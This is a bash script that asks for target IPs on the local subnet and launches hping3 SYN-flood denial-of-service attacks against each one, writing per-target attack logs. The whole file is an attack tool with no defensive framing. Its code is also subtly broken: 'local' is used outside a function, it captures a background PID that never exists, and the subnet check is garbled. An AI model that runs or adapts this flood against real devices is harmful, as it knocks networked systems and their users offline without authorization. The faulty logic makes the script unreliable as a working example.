#!/bin/bash

echo -n "Enter the number of devices you want to attack: "
read num

# Function to get the local network and subnet
get_local_network_info() {
    local_ip=$(ip -4 addr show scope global | grep inet | awk '{print $2}' | head -n 1)
    subnet="${local_ip%.*}.0/24"  # Assuming a /24 subnet
    echo "Local IP: $local_ip"
    echo "Subnet: $subnet"
}

network_info=$(get_local_network_info)
echo "Local network info: $network_info"


for i in $(seq 1 $num)
do
    echo -n "Enter the IP of device $i: "
    read IP

	local ip_to_check=$IP
	local network=$(get_local_network_info)

	if ipcalc -n $network | grep -q "$ip_to_check"; then
	    log_file="${i}_attack.log"
	    echo "Starting attack on $IP. Logging to $log_file."
	    
	    echo "Sending SYN packets to $IP from $network_info"
	    sudo hping3 -S --flood -V $IP >> "$log_file" 
	    pids+=($!)  # Capture the PID of the background process
	    echo "Attack on $IP initiated. Check $log_file for details."
	else
        echo "$ip_to_check is NOT in the local network."
    fi

done

echo "All attacks completed."
